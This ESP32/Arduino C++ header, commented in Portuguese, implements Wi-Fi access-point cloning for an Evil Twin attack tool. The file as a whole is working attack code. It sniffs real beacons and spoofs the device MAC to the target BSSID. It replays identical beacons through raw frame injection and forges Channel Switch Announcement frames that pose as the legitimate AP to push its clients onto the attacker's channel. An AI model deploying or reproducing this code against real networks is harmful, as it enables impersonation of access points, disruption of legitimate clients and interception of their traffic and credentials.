#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "../config.h"

/*
 * APClone — Clonagem fiel de APs Wi-Fi
 *
 * Tecnicas implementadas:
 *   1. Beacon Sniff:   captura raw frame do beacon do alvo (via sniffer promiscuo)
 *   2. IE Mirror:      replica fielmente todos os IEs (SSID, RSN, Rates, HT, VHT, Vendor)
 *   3. Beacon Replay:  injeta beacons identicos ao alvo com mesmo BSSID
 *   4. BSSID Spoof:    altera o MAC do AP do ESP32 para o BSSID alvo antes de softAP
 *   5. CSA Injection:  Channel Switch Announcement forcando clientes a mudar de canal
 *   6. Interval Match: usa o mesmo beacon interval do AP real (tipicamente 100 TU)
 *
 * Uso no Evil Twin:
 *   1. Sniffer captura beacons → APClone::get().onBeacon() armazena
 *   2. EvilTwin::startClone(idx) chama APClone::get().spoofMac() + configura AP clone
 *   3. APClone::get().tick() injeta beacons identicos em paralelo
 *   Resultado: clientes veem o mesmo SSID + BSSID + seguranca que o AP real
 */
class APClone {
public:
    static APClone& get() { static APClone inst; return inst; }

    struct CapturedBeacon {
        uint8_t  bssid[6];
        char     ssid[33];
        uint8_t  channel;
        int8_t   rssi;
        uint16_t beaconInterval;   // em TUs (1 TU = 1024 µs)
        uint16_t capabilities;     // bits de capability do beacon original
        uint8_t  ieData[256];      // IEs brutos comeando no byte 36 do frame
        uint8_t  ieLen;
        bool     hasHT  = false;   // 802.11n (IE 45)
        bool     hasVHT = false;   // 802.11ac (IE 191)
        bool     hasRSN = false;   // WPA2/WPA3 (IE 48)
        bool     hasWPA = false;   // WPA TKIP (IE 221, OUI 00:50:F2:01)
        bool     hasPMF = false;   // Protected Management Frames ativado
        bool     valid  = false;
        uint32_t captureTs;
        uint8_t  authMode; // 0=open,1=wep,2=wpa,3=wpa2,4=wpa2e,5=wpa3
    };

    std::vector<CapturedBeacon> captured;
    bool    replayRunning = false;
    uint8_t replayIdx     = 0xFF;

    // === Chamado pelo sniffer a cada beacon capturado ===
    void onBeacon(const uint8_t* frame, size_t len, int8_t rssi, uint8_t ch) {
        if (len < 36) return;
        // FC: type=0 (mgmt), subtype=8 (beacon)
        if ((frame[0] & 0xFC) != 0x80) return;

        const uint8_t* bssid = frame + 16; // addr3 no header

        // Ignorar nosso proprio AP
        uint8_t myAP[6];
        esp_wifi_get_mac(WIFI_IF_AP, myAP);
        if (memcmp(bssid, myAP, 6) == 0) return;

        // Fixed fields (ap do body, offset 24 no frame):
        //  24-31: timestamp (8 bytes)
        //  32-33: beacon interval
        //  34-35: capabilities
        //  36+:   IEs
        uint16_t bi   = (uint16_t)frame[32] | ((uint16_t)frame[33] << 8);
        uint16_t caps = (uint16_t)frame[34] | ((uint16_t)frame[35] << 8);

        // Extrai SSID e analisa IEs
        char ssid[33] = {};
        bool hasRSN = false, hasHT = false, hasVHT = false, hasPMF = false, hasWPA = false;
        uint8_t authMode = 0;
        const uint8_t* ie = frame + 36;
        size_t ieLen = (len > 36) ? (len - 36) : 0;
        size_t i = 0;
        while (i + 1 < ieLen) {
            uint8_t id  = ie[i];
            uint8_t iel = ie[i+1];
            if (i + 2 + iel > ieLen) break;
            switch (id) {
                case 0: // SSID
                    if (iel > 0 && iel <= 32) {
                        memcpy(ssid, ie + i + 2, iel);
                        ssid[iel] = 0;
                    }
                    break;
                case 45: hasHT  = true; break; // HT Capabilities
                case 48: // RSN IE (WPA2/WPA3)
                    hasRSN = true;
                    authMode = 3; // WPA2
                    // Check PMF: RSN Capabilities byte 0 bit 6 = MFP capable, bit 7 = MFP required
                    if (iel >= 20) {
                        uint8_t rsnCaps0 = ie[i + 2 + 18];
                        if (rsnCaps0 & 0x80) hasPMF = true; // MFP required
                    }
                    // Check WPA3 (SAE AKM = 00:0F:AC:08)
                    if (iel >= 12) {
                        for (size_t k = i + 2 + 8; k + 4 <= i + 2 + iel; k += 4) {
                            if (ie[k+3] == 0x08 && ie[k+2] == 0xAC && ie[k+1] == 0x0F && ie[k] == 0x00)
                                authMode = 6; // WPA3
                        }
                    }
                    break;
                case 191: hasVHT = true; break; // VHT Capabilities (ac)
                case 221: // Vendor Specific
                    // WPA IE: OUI 00:50:F2, type 01
                    if (iel >= 4 && ie[i+2]==0x00 && ie[i+3]==0x50 && ie[i+4]==0xF2 && ie[i+5]==0x01) {
                        hasWPA = true;
                        if (!hasRSN) authMode = 2;
                    }
                    break;
                default: break;
            }
            i += 2 + iel;
        }
        if (ssid[0] == 0) return; // hidden — beacon sem SSID (redes ocultas)

        // Atualiza se ja existe este BSSID
        for (auto& c : captured) {
            if (memcmp(c.bssid, bssid, 6) == 0) {
                c.rssi       = rssi;
                c.channel    = ch;
                c.captureTs  = millis();
                // Re-capture IEs se o frame for maior (mais completo)
                size_t newIeLen = ieLen < 256 ? ieLen : 255;
                if (newIeLen > c.ieLen) {
                    memcpy(c.ieData, ie, newIeLen);
                    c.ieLen = newIeLen;
                    c.hasHT = hasHT; c.hasVHT = hasVHT;
                    c.hasRSN = hasRSN; c.hasWPA = hasWPA;
                    c.hasPMF = hasPMF; c.authMode = authMode;
                    c.capabilities = caps; c.beaconInterval = bi;
                }
                return;
            }
        }

        if (captured.size() >= 48) return;

        CapturedBeacon cb;
        memcpy(cb.bssid, bssid, 6);
        strncpy(cb.ssid, ssid, 32);
        cb.ssid[32]       = 0;
        cb.channel        = ch;
        cb.rssi           = rssi;
        cb.beaconInterval = (bi > 0 && bi < 1000) ? bi : 100;
        cb.capabilities   = caps;
        cb.hasHT   = hasHT; cb.hasVHT = hasVHT;
        cb.hasRSN  = hasRSN; cb.hasWPA = hasWPA;
        cb.hasPMF  = hasPMF; cb.authMode = authMode;
        cb.valid   = true;
        cb.captureTs = millis();
        size_t ieToSave = ieLen < 255 ? ieLen : 255;
        memcpy(cb.ieData, ie, ieToSave);
        cb.ieLen = (uint8_t)ieToSave;
        captured.push_back(cb);

        String sec = hasRSN ? (hasPMF ? "WPA3/PMF" : "WPA2") :
                     hasWPA ? "WPA" : "Open";
        String phy = hasVHT ? " AC" : hasHT ? " N" : "";
        LOG.info("[CLONE] Capturado: \"" + String(ssid) + "\" [" + _bstr(bssid) + "]"
                 " ch" + String(ch) + " " + sec + phy + " rssi=" + String(rssi));
    }

    // Inicia replay de beacons clonados para o AP no indice idx
    void startReplay(uint8_t idx) {
        if (idx >= captured.size()) return;
        replayRunning = true;
        replayIdx     = idx;
        auto& cb = captured[idx];
        LOG.warn("[CLONE] Replay: \"" + String(cb.ssid) + "\" ["
                 + _bstr(cb.bssid) + "] ch" + String(cb.channel));
    }

    void stopReplay() {
        replayRunning = false;
        replayIdx     = 0xFF;
        LOG.info("[CLONE] Replay parado");
    }

    // Tick: injeta beacons clonados no intervalo correto
    void tick() {
        if (!replayRunning || replayIdx >= captured.size()) return;
        auto& cb = captured[replayIdx];
        unsigned long now = millis();
        // beacon interval em ms (1 TU = 1.024ms, arredondamos para 1ms)
        uint32_t intervalMs = cb.beaconInterval;
        if (now - _lastReplayMs < intervalMs) return;
        _lastReplayMs = now;
        _sendClonedBeacon(cb);
    }

    // Altera o MAC do AP do ESP32 para o BSSID do alvo
    // Chame ANTES de WiFi.softAP() para spoof completo
    bool spoofMac(const uint8_t* targetBssid) {
        esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, targetBssid);
        if (err == ESP_OK) {
            LOG.success("[CLONE] BSSID spoofado: " + _bstr(targetBssid));
            return true;
        }
        // Fallback: tenta parar + reconfigurar o modo antes
        esp_wifi_stop();
        delay(50);
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        err = esp_wifi_set_mac(WIFI_IF_AP, targetBssid);
        esp_wifi_start();
        if (err == ESP_OK) {
            LOG.success("[CLONE] BSSID spoofado (modo reset): " + _bstr(targetBssid));
            return true;
        }
        LOG.warn("[CLONE] BSSID spoof falhou (err=" + String(err)
                 + ") — usando frame injection sem spoof");
        return false;
    }

    // Restaura o MAC original do AP (salvo antes do spoof)
    void restoreMac() {
        if (_origMacSaved) {
            esp_wifi_set_mac(WIFI_IF_AP, _origMac);
            LOG.info("[CLONE] MAC original restaurado");
            _origMacSaved = false;
        }
    }

    // Salva MAC original antes de spoofar
    void saveOriginalMac() {
        esp_wifi_get_mac(WIFI_IF_AP, _origMac);
        _origMacSaved = true;
    }

    // Busca beacon capturado por SSID (para o Karma usar IEs exatos)
    const CapturedBeacon* findBySSID(const char* ssid) const {
        for (auto& c : captured)
            if (strcmp(c.ssid, ssid) == 0) return &c;
        return nullptr;
    }

    // Busca beacon capturado por BSSID
    const CapturedBeacon* findByBSSID(const uint8_t* bssid) const {
        for (auto& c : captured)
            if (memcmp(c.bssid, bssid, 6) == 0) return &c;
        return nullptr;
    }

    // Injeta Channel Switch Announcement (CSA) — forca clientes a mudar de canal
    // Util para mover clientes de um canal congestionado para onde estamos com o clone
    void sendCSA(const uint8_t* apBssid, uint8_t newChannel, uint8_t count = 3) {
        // Envia 5 rafadas de Action frames CSA (Spectrum Management)
        for (int rep = 0; rep < 5; rep++) {
            _sendCSAAction(apBssid, newChannel, count > rep ? count - rep : 1);
            _sendCSABeacon(apBssid, newChannel, count > rep ? count - rep : 1);
        }
        LOG.warn("[CLONE] CSA: migrando clientes de " + _bstr(apBssid)
                 + " para canal " + String(newChannel));
    }

    // Retorna JSON da lista de APs clonados para o frontend
    String toJson() const {
        String j = "[";
        for (size_t i = 0; i < captured.size(); i++) {
            auto& c = captured[i];
            if (i) j += ",";
            j += "{\"idx\":" + String(i);
            j += ",\"ssid\":\"" + _esc(c.ssid) + "\"";
            j += ",\"bssid\":\"" + _bstr(c.bssid) + "\"";
            j += ",\"ch\":" + String(c.channel);
            j += ",\"rssi\":" + String(c.rssi);
            j += ",\"auth\":" + String(c.authMode);
            j += ",\"ht\":"  + String(c.hasHT  ? "true" : "false");
            j += ",\"vht\":" + String(c.hasVHT ? "true" : "false");
            j += ",\"rsn\":" + String(c.hasRSN ? "true" : "false");
            j += ",\"pmf\":" + String(c.hasPMF ? "true" : "false");
            j += ",\"bi\":"  + String(c.beaconInterval);
            j += "}";
        }
        j += "]";
        return j;
    }

    void clearCaptured() {
        captured.clear();
        stopReplay();
        LOG.info("[CLONE] Beacons limpos");
    }

private:
    unsigned long _lastReplayMs = 0;
    uint8_t       _origMac[6]   = {};
    bool          _origMacSaved = false;

    static String _bstr(const uint8_t* b) {
        char buf[18];
        snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
                 b[0],b[1],b[2],b[3],b[4],b[5]);
        return buf;
    }
    static String _esc(const char* s) {
        String r = s;
        r.replace("\"","\\\"");
        return r;
    }
    static String _esc(const String& s) { return _esc(s.c_str()); }

    // Beacon clone com IEs identicos ao AP real
    void _sendClonedBeacon(const CapturedBeacon& cb) {
        uint8_t frame[350] = {};
        uint8_t off = 0;

        frame[off++] = 0x80; frame[off++] = 0x00; // Beacon
        frame[off++] = 0x00; frame[off++] = 0x00; // Duration
        memset(frame + off, 0xFF, 6); off += 6;    // DA broadcast
        memcpy(frame + off, cb.bssid, 6); off += 6; // SA = BSSID real
        memcpy(frame + off, cb.bssid, 6); off += 6; // BSSID = BSSID real
        frame[off++] = 0x00; frame[off++] = 0x00;   // Seq

        // Timestamp crescente (como AP real)
        uint64_t ts = esp_timer_get_time();
        memcpy(frame + off, &ts, 8); off += 8;

        // Beacon interval exato do AP real
        frame[off++] = cb.beaconInterval & 0xFF;
        frame[off++] = (cb.beaconInterval >> 8) & 0xFF;

        // Capabilities exatas do AP real
        frame[off++] = cb.capabilities & 0xFF;
        frame[off++] = (cb.capabilities >> 8) & 0xFF;

        // IEs exatos (copia fiel do beacon capturado)
        size_t available = sizeof(frame) - off;
        size_t ieToSend  = cb.ieLen < available ? cb.ieLen : available;
        memcpy(frame + off, cb.ieData, ieToSend);
        off += ieToSend;

        esp_wifi_set_channel(cb.channel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
    }

    // CSA Action frame (Spectrum Management, category=0, action=4)
    void _sendCSAAction(const uint8_t* bssid, uint8_t newCh, uint8_t count) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        uint8_t f[35] = {};
        f[0] = 0xD0; f[1] = 0x00; // Action
        f[2] = 0x3A; f[3] = 0x01;
        memcpy(f+4,  bcast, 6);  // DA broadcast
        memcpy(f+10, bssid, 6);  // SA (finge ser o AP)
        memcpy(f+16, bssid, 6);  // BSSID
        f[22] = 0x00; f[23] = 0x00;
        f[24] = 0x00; // Category: Spectrum Management
        f[25] = 0x04; // Action: Channel Switch Announcement
        f[26] = 0x25; // IE tag 37 = CSA
        f[27] = 0x03; // len=3
        f[28] = 0x01; // Mode=1 (clientes param de transmitir antes da troca)
        f[29] = newCh;
        f[30] = count;
        // Extended CSA IE (tag 60) — para compatibilidade 802.11n+
        f[31] = 0x3C; f[32] = 0x03;
        f[33] = 0x01; f[34] = newCh;
        esp_wifi_80211_tx(WIFI_IF_AP, f, 35, true);
    }

    // CSA via Beacon (injeta beacon com CSA IE incluida)
    // Clientes que nao aceitam Action frames ainda obedecerão ao beacon
    void _sendCSABeacon(const uint8_t* bssid, uint8_t newCh, uint8_t count) {
        uint8_t frame[128] = {};
        uint8_t off = 0;
        frame[off++] = 0x80; frame[off++] = 0x00;
        frame[off++] = 0x00; frame[off++] = 0x00;
        memset(frame + off, 0xFF, 6); off += 6;
        memcpy(frame + off, bssid, 6); off += 6;
        memcpy(frame + off, bssid, 6); off += 6;
        frame[off++] = 0x00; frame[off++] = 0x00;
        uint64_t ts = esp_timer_get_time();
        memcpy(frame + off, &ts, 8); off += 8;
        frame[off++] = 0x64; frame[off++] = 0x00; // BI 100 TU
        frame[off++] = 0x31; frame[off++] = 0x04; // Caps
        // CSA IE
        frame[off++] = 0x25; frame[off++] = 0x03;
        frame[off++] = 0x01; frame[off++] = newCh; frame[off++] = count;
        esp_wifi_set_channel(newCh, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, true);
    }
};
